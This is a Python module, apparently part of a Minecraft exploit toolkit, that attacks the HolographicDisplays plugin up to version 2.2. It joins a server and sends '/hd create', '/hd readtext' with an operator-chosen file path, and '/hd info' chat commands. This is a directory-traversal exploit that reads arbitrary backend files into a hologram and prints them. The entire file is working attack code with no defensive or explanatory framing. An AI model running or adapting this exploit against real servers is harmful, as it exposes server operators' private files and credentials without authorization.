from minecraft.networking.connection import Connection
import minecraft.networking.packets
from minecraft.networking.packets import Packet, clientbound, serverbound
import sys
import time
import random


class Exploit:
    """Exploit schema"""
    def __init__(self, client: Connection=None):
        self.name = "Holographics <= v2.2.*"
        self.description = "Read existing backend file paths via directory traversal"
        self.client = client

    def onJoin(self, dog):
        print('Connected', dog)

    def waitForResponse(self, chat_packet):
        print("Message (%s): %s" % (chat_packet.field_string('position'), chat_packet.json_data))

    def execute(self) -> tuple[bool, str]:
        self.client.register_packet_listener(
            self.waitForResponse, minecraft.networking.packets.ChatMessagePacket)  #: on chat, receive event

        self.client.register_packet_listener(
            self.onJoin, minecraft.networking.packets.JoinGamePacket)

        hologramName = input("Hologram Name: ")
        directory = input("File Directory: ")

        self.client.connect()

        input('Press enter joined.')

        time.sleep(1.5)

        packet = minecraft.networking.packets.ChatPacket()  #: chat packet structure
        packet.message = "/hd create {}".format(hologramName)  #: creates hologram
        self.client.write_packet(packet)  #: sends message

        time.sleep(2.0)

        packet.message = "/hd readtext {} {}".format(hologramName, directory)  #: pastes lines from file into hologram
        self.client.write_packet(packet)  #: sends message

        time.sleep(2.0)

        packet.message = "/hd info {}".format(hologramName)  #: lists all lines from hologram
        self.client.write_packet(packet)  #: sends message

        input('Press enter joined.')

        return True, "Success in Message"
